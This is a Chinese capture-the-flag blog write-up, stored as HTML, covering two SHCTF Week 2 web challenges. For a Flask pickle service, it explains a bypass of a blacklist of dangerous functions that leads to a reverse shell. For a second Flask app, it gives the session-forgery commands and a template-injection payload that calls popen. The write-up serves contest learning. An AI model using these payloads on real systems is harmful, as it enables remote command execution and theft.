@@ -1,0 +1,791 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="有高总有低 如不懂心计 能珍惜一切 -《Life Goes On》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SHCTF week2-web">
+<meta property="og:url" content="http://example.com/2025/02/20/shctf-Week2/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="有高总有低 如不懂心计 能珍惜一切 -《Life Goes On》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/a1.jpg">
+<meta property="article:published_time" content="2025-02-20T05:14:59.000Z">
+<meta property="article:modified_time" content="2025-04-02T05:26:46.110Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="比赛Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/a1.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SHCTF week2-web - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/" target="_self">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/LGO.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SHCTF week2-web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-20 13:14" pubdate>
+          2025年2月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SHCTF week2-web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="shctf-Week2-dickle"><a href="#shctf-Week2-dickle" class="headerlink" title="shctf [Week2]dickle"></a>shctf [Week2]dickle</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> io<br><br>BLACKLISTED_CLASSES = [<br>    <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>,<span class="hljs-string">&#x27;builtins.eval&#x27;</span>,<span class="hljs-string">&#x27;builtins.exec&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.system&#x27;</span>, <span class="hljs-string">&#x27;os.popen&#x27;</span>, <span class="hljs-string">&#x27;os.popen2&#x27;</span>, <span class="hljs-string">&#x27;os.popen3&#x27;</span>, <span class="hljs-string">&#x27;os.popen4&#x27;</span>, <br>    <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>, <br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>, <br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <br>    <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>, <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span>,<br>    <span class="hljs-string">&#x27;__import__&#x27;</span>,<span class="hljs-string">&#x27;os.spawn*&#x27;</span>,<span class="hljs-string">&#x27;sh.Command&#x27;</span>,<span class="hljs-string">&#x27;imp.load_module&#x27;</span>,<span class="hljs-string">&#x27;builtins.compile&#x27;</span><br>    <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;builtins.execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;builtins.open&#x27;</span>, <span class="hljs-string">&#x27;builtins.file&#x27;</span>, <span class="hljs-string">&#x27;os.system&#x27;</span>, <br>    <span class="hljs-string">&#x27;os.fdopen&#x27;</span>, <span class="hljs-string">&#x27;os.tmpfile&#x27;</span>, <span class="hljs-string">&#x27;os.fchmod&#x27;</span>, <span class="hljs-string">&#x27;os.fchown&#x27;</span>, <span class="hljs-string">&#x27;os.open&#x27;</span>, <span class="hljs-string">&#x27;os.openpty&#x27;</span>, <span class="hljs-string">&#x27;os.read&#x27;</span>, <span class="hljs-string">&#x27;os.pipe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.chdir&#x27;</span>, <span class="hljs-string">&#x27;os.fchdir&#x27;</span>, <span class="hljs-string">&#x27;os.chroot&#x27;</span>, <span class="hljs-string">&#x27;os.chmod&#x27;</span>, <span class="hljs-string">&#x27;os.chown&#x27;</span>, <span class="hljs-string">&#x27;os.link&#x27;</span>, <span class="hljs-string">&#x27;os.lchown&#x27;</span>, <span class="hljs-string">&#x27;os.listdir&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.lstat&#x27;</span>, <span class="hljs-string">&#x27;os.mkfifo&#x27;</span>, <span class="hljs-string">&#x27;os.mknod&#x27;</span>, <span class="hljs-string">&#x27;os.access&#x27;</span>, <span class="hljs-string">&#x27;os.mkdir&#x27;</span>, <span class="hljs-string">&#x27;os.makedirs&#x27;</span>, <span class="hljs-string">&#x27;os.readlink&#x27;</span>, <span class="hljs-string">&#x27;os.remove&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.removedirs&#x27;</span>, <span class="hljs-string">&#x27;os.rename&#x27;</span>, <span class="hljs-string">&#x27;os.renames&#x27;</span>, <span class="hljs-string">&#x27;os.rmdir&#x27;</span>, <span class="hljs-string">&#x27;os.tempnam&#x27;</span>, <span class="hljs-string">&#x27;os.tmpnam&#x27;</span>, <span class="hljs-string">&#x27;os.unlink&#x27;</span>, <span class="hljs-string">&#x27;os.walk&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.execl&#x27;</span>, <span class="hljs-string">&#x27;os.execle&#x27;</span>, <span class="hljs-string">&#x27;os.execlp&#x27;</span>, <span class="hljs-string">&#x27;os.execv&#x27;</span>, <span class="hljs-string">&#x27;os.execve&#x27;</span>, <span class="hljs-string">&#x27;os.dup&#x27;</span>, <span class="hljs-string">&#x27;os.dup2&#x27;</span>, <span class="hljs-string">&#x27;os.execvp&#x27;</span>, <span class="hljs-string">&#x27;os.execvpe&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.fork&#x27;</span>, <span class="hljs-string">&#x27;os.forkpty&#x27;</span>, <span class="hljs-string">&#x27;os.kill&#x27;</span>, <span class="hljs-string">&#x27;os.spawnl&#x27;</span>, <span class="hljs-string">&#x27;os.spawnle&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnlpe&#x27;</span>, <span class="hljs-string">&#x27;os.spawnv&#x27;</span>,<br>    <span class="hljs-string">&#x27;os.spawnve&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvp&#x27;</span>, <span class="hljs-string">&#x27;os.spawnvpe&#x27;</span>, <span class="hljs-string">&#x27;pickle.load&#x27;</span>, <span class="hljs-string">&#x27;pickle.loads&#x27;</span>, <span class="hljs-string">&#x27;cPickle.load&#x27;</span>, <span class="hljs-string">&#x27;cPickle.loads&#x27;</span>,<br>    <span class="hljs-string">&#x27;subprocess.call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_call&#x27;</span>, <span class="hljs-string">&#x27;subprocess.check_output&#x27;</span>, <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>,<br>    <span class="hljs-string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getoutput&#x27;</span>, <span class="hljs-string">&#x27;commands.getstatus&#x27;</span>, <span class="hljs-string">&#x27;glob.glob&#x27;</span>,<br>    <span class="hljs-string">&#x27;linecache.getline&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="hljs-string">&#x27;shutil.copyfile&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy&#x27;</span>, <span class="hljs-string">&#x27;shutil.copy2&#x27;</span>, <span class="hljs-string">&#x27;shutil.move&#x27;</span>,<br>    <span class="hljs-string">&#x27;shutil.make_archive&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen2&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen3&#x27;</span>, <span class="hljs-string">&#x27;popen2.popen4&#x27;</span>, <span class="hljs-string">&#x27;timeit.timeit&#x27;</span>, <span class="hljs-string">&#x27;sys.call_tracing&#x27;</span>,<br>    <span class="hljs-string">&#x27;code.interact&#x27;</span>, <span class="hljs-string">&#x27;code.compile_command&#x27;</span>, <span class="hljs-string">&#x27;codeop.compile_command&#x27;</span>, <span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;posixfile.open&#x27;</span>,<br>    <span class="hljs-string">&#x27;posixfile.fileopen&#x27;</span><br>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;name&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> BLACKLISTED_CLASSES:<br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;Forbidden class: %s.%s&quot;</span> % (module, name))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().find_class(module, name)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        encoded_data = request.form[<span class="hljs-string">&quot;data&quot;</span>]<br>        decoded_data = base64.b64decode(encoded_data)<br>        <br>        <span class="hljs-keyword">try</span>:<br>            data_stream = io.BytesIO(decoded_data)<br>            unpickler = SafeUnpickler(data_stream)<br>            result = unpickler.load()<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Deserialized data: <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(result)&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error during deserialization: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>waf看着很长，其实是幌子，实际上治标不治本</p>
+<p>没有过滤<code>__reduce__</code>，这个方法在序列化时会被调用</p>
+<p>分析过滤类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeUnpickler</span>(pickle.Unpickler): <span class="hljs-comment">#表示SafeUnpickler继承pickle.Unpickler</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>): <span class="hljs-comment">#重写 find_class 方法 用做过滤</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;module&#125;</span>.<span class="hljs-subst">&#123;name&#125;</span>&quot;</span> <span class="hljs-keyword">in</span> BLACKLISTED_CLASSES: <br>            <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;Forbidden class: %s.%s&quot;</span> % (module, name))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().find_class(module, name)  <span class="hljs-comment">#调用父类方法 也就是正常pickle反序列化</span><br></code></pre></td></tr></table></figure>
+
+<p> 在反序列化过程中，如果 <code>pickle</code> 模块遇到一个表示类的标记，它会调用 <code>find_class</code> 方法来查找和创建相应的类实例。</p>
+<p><code>find_class</code> 方法将识别到的 <code>module</code> 和 <code>name</code> 取决于 <code>__reduce__</code> 方法返回的内容。</p>
+<p><code>module</code>是类的模块名，例如 “<code>os</code>“。<code>name</code>是类名，例如 “<code>system</code>“</p>
+<p>如果反序列化后执行的是<code>os.system</code>则会被禁止，抛出异常</p>
+<p>如果你想直接<code>return (eval, (&quot;__import__(&#39;os&#39;).popen(&#39;tac /flag&#39;).read()&quot;,))</code>是行不通的</p>
+<p>本地调试</p>
+<p>在过滤类打印<code>find_class</code></p>
+<p><img src="/mdimg/shctfweek2/1728490095306-75fed041-6e50-4228-9a02-4d14bd69cd85.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/shctfweek2/1729065904479-ceef71e7-85e7-4ac1-8c75-56690f457716.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p><code>find_class</code> 解析的是 <code>posix.system</code> 而不是 <code>os.system</code></p>
+<p>在反序列化过程中， pickle 使用 <code>find_class</code> 方法来定位和导入必要的类或函数。由于 pickle 记录的是 <code>posix.system</code>，因此<code> find_class</code> 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。</p>
+<p>所以可以用<code>os.system</code></p>
+<p>当然<code>os.system </code>执行结果只会显示在服务端，客户端返回的是退出状态码也就是执行成功为0，不会返回执行结果</p>
+<p>所以要反弹shell</p>
+<p><img src="/mdimg/shctfweek2/1728483888146-6bf0e191-aea5-4503-b68b-71da39ce4f68.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Week2-入侵者禁入"><a href="#Week2-入侵者禁入" class="headerlink" title="[Week2]入侵者禁入"></a>[Week2]入侵者禁入</h3><p>session伪造、ssti</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, render_template_string <br>app = Flask(__name__) <br>app.secret_key = <span class="hljs-string">&#x27;0day_joker&#x27;</span> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    session[<span class="hljs-string">&#x27;role&#x27;</span>] = &#123; <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-string">&#x27;your_flag_here&#x27;</span> &#125; <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file: <br>        code = file.read() <br>        <span class="hljs-keyword">return</span> code <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>(): <br>        <span class="hljs-keyword">try</span>: <br>            role = session.get(<span class="hljs-string">&#x27;role&#x27;</span>) <br>            <span class="hljs-built_in">print</span>(role)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(role, <span class="hljs-built_in">dict</span>): <br>                <span class="hljs-keyword">raise</span> Exception <br>        <span class="hljs-keyword">except</span> Exception: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Without you, you are an intruder!&#x27;</span> <br>        <span class="hljs-keyword">if</span> role.get(<span class="hljs-string">&#x27;is_admin&#x27;</span>) == <span class="hljs-number">1</span>: <br>            flag = role.get(<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;admin&#x27;</span> <br>            message = <span class="hljs-string">&quot;Oh,I believe in you! The flag is: %s&quot;</span> % flag <br>            <span class="hljs-keyword">return</span> render_template_string(message) <br>        <span class="hljs-keyword">else</span>: <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: You don&#x27;t have the power!&quot;</span> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure>
+
+<p><code>[https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)</code></p>
+<p>知道secret_key直接构造session，先解session</p>
+<p><code>python3 flask_session_cookie_manager3.py decode -s &#39;0day_joker&#39; -c &#39;eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.Zw6NhA.pRHC2qR5Y51O6ozJrrmIlpJaFrc&#39;</code></p>
+<p><img src="/mdimg/shctfweek2/1729008498155-53206e87-8b8c-456f-b1d4-532a180535ce.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造session</p>
+<p><code>python3 flask_session_cookie_manager3.py encode  -s &#39;0day_joker&#39; -t &quot;&#123;&#39;role&#39;: &#123;&#39;flag&#39;: &#39;&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;&#39;, &#39;is_admin&#39;: 1&#125;&#125;&quot;</code></p>
+<p><code>.eJyrVirKz0lVsqpWSstJTFeyUqqujo7Vi49PzkksLo6PB7KSEotTgaxoA5BwcWkSWAYkoqFZW6uko5RZHJ-YkpuZp2RlWFsLAFUDG9c.Zw6U2Q.PrL0RzrhMuUdUo5n-YvDce8Q2H0</code></p>
+<p>第138个<code>&gt;</code>说明<code>os.wrap</code>在第137个（列表从0开始，ctrl+f从1开始所以要-1）</p>
+<p><img src="/mdimg/shctfweek2/1729008640337-c0d14379-0530-4d1e-83f4-7994e15d2985.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过<code>.__init__.__globals__.popen</code>调用<code>popen</code>方法</p>
+<p>因为用单引号会报错，不能通过<code>popen(&#39;cat /f*&#39;)</code>来执行系统命令</p>
+<p>所以用传参来绕过</p>
+<p>在 Flask 中，<code>request.args</code> 是一个包含所有查询字符串参数的列表</p>
+<p><code>request.args.a</code>表示a参数的值</p>
+<p><code>python3 flask_session_cookie_manager3.py encode  -s &#39;0day_joker&#39; -t &quot;&#123;&#39;role&#39;: &#123;&#39;flag&#39;: &#39;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[137].__init__.__globals__.popen(request.args.a).read()&#125;&#125;&#39;, &#39;is_admin&#39;: 1&#125;&#125;&quot;</code></p>
+<p><code>.eJwdi0EKwyAQRe8yK4UiDV0UvIqUYWymIkw1dZKVePfG7B7vv9-hVWHwHT5CCTz0Hl4O8S2kinhSJOWTwn1qPeK1TGNsWB7PaXPJ-9UmqZFk_ra6cTGNfwfr7qgldWRdY1qNHQNukBVp_eYCfhnjD3qJL0U.Zw9wdQ.pgUNXO7rv0tczhfeUiBwXS32VS8</code></p>
+<p><img src="/mdimg/shctfweek2/1729065160411-7485f38a-3970-4cb1-a4c1-561478b942e8.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
